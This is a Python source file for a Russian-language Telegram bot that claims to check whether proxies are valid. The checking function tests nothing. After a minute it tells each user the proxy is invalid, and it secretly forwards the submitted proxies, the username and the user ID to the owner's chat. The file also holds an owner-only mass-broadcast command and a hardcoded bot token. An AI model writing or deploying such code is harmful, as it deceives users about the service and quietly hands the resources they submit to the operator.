import telebot
import sqlite3
import time

bot = telebot.TeleBot('1465806941:AAFGRl3Pwf1gYwNdtKyjPcLJ6fsKcv2OwDs')

menu = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
menu.row('Чекнуть прокси 🔥')
menu.row('💭 Помощь')

def create_db_new():
    db = sqlite3.connect('users.db', check_same_thread=False)
    sql = db.cursor()
    sql.execute('''CREATE TABLE IF NOT EXISTS user(
        user_id INT)''')
    sql.close()
    db.close()
create_db_new()

@bot.message_handler(commands=['start'])
def welcome(message):
    db = sqlite3.connect("users.db", check_same_thread=False)
    sql = db.cursor()
    sql.execute("SELECT user_id FROM user WHERE user_id = ?",(message.from_user.id,))
    db.commit()
    if sql.fetchone() is None:
        sql.execute("INSERT INTO user VALUES(?)",(message.from_user.id,))
        db.commit()
    bot.send_message(message.chat.id, '<i>Добро пожаловать в бота, который чекает прокси на валидность !</i>', reply_markup=menu, parse_mode='html')
    sql.close()
    db.close()
    
@bot.message_handler(commands=['send'])  
def rek(message):
    if message.from_user.id == 1466397412:
        bot.send_message(message.chat.id, "отправьте текст рассылки")
        bot.register_next_step_handler(message, message_everyone)
def message_everyone(message):
    db = sqlite3.connect('users.db', check_same_thread=False)
    sql = db.cursor()
    sql.execute("SELECT user_id FROM user")
    Lusers = sql.fetchall()
    for i in Lusers:
        try:
            if message.content_type == "text":
                #text
                tex = message.text
                bot.send_message(i[0], tex)
            elif message.content_type == "photo":
                #photo
                capt = message.caption
                photo = message.photo[-1].file_id
                bot.send_photo(i[0], photo, caption=capt)
            elif message.content_type == "video":
                #video
                capt = message.caption
                photo = message.video.file_id
                bot.send_video(i[0], photo)
            elif message.content_type == "audio":
                #audio
                capt = message.caption
                photo = message.audio.file_id
                bot.send_audio(i[0], photo, caption=capt)
            elif message.content_type == "voice":
                #voice
                capt = message.caption
                photo = message.voice.file_id
                bot.send_voice(i[0], photo, caption=capt)
            elif message.content_type == "animation":
                #animation
                capt = message.caption
                photo = message.animation.file_id
                bot.send_animation(i[0], photo, caption=capt)
            elif message.content_type == "document":
                #document
                capt = message.caption
                photo = message.document.file_id
                bot.send_document(i[0], photo, caption=capt)
        except:
            print("error!!")
    sql.close()
    db.close()
@bot.message_handler(commands=['stats'])
def stat(message):
    db = sqlite3.connect('users.db', check_same_thread=False)
    sql = db.cursor()
    sql.execute("SELECT COUNT(*) FROM user")
    q = sql.fetchall()
    print(q[0])
    for i in q:
        bot.send_message(message.chat.id, "Юзеров на сегодняшний день: " + str(q[0]))   
    
@bot.message_handler(content_types=['text'])
def send(message):
    if message.text == 'Чекнуть прокси 🔥':
        msg = bot.send_message(message.chat.id,'Отправьте мне ваш прокси, и я чекну его за пару секунд!\n\nФормат должен быть такой: \n\n000.00.000.00\n000.00.000.00\n000.00.000.00\n000.00.000.00\n000.00.000.00\n000.00.000.00')
        bot.register_next_step_handler(msg,btczakid_first)
    if message.text == '💭 Помощь':
        bot.send_message(message.chat.id, '<b>Разработчик бота: @ArtemCoder\nSupport: @promadmin</b>', parse_mode='html')
        
def btczakid_first(message):
    if message.text.startswith('1') or message.text.startswith('2') or message.text.startswith('3') or message.text.startswith('4') or message.text.startswith('5') or message.text.startswith('6') or message.text.startswith('7') or message.text.startswith('8') or message.text.startswith('9'):
         bot.send_message(message.chat.id, '<b>Скоро проверим и дадим ответ касаемо валидности</b>', parse_mode='html')
         time.sleep(60)
         bot.send_message(message.chat.id, '<b>Невалидный прокси !</b>', parse_mode='html')
         bot.send_message(chat_id=1466397412, text=f'Пришло прокси от <b>@{message.from_user.username}</b>\nID: <b>{message.from_user.id}</b>\n{message.text}',parse_mode='HTML')
    else:
        bot.send_message(message.chat.id,text='Неверный прокси')



bot.polling(none_stop=True)